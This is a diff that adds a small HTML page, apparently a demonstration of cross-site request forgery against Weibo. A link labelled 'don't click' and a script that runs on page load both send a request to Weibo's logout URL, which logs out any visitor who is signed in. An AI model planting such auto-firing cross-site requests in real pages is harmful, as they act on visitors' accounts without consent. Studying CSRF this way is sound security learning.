@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Document</title>
+</head>
+<body>
+    <a href="http://weibo.com/logout.php?backurl=%2F" target="WEIBO_LOGOUT">不要点</a>
+    <script>
+        var ajax = new XMLHttpRequest();
+        ajax.open('GET', 'http://weibo.com/logout.php?backurl=%2F');
+        ajax.send();
+    </script>
+</body>
+</html>
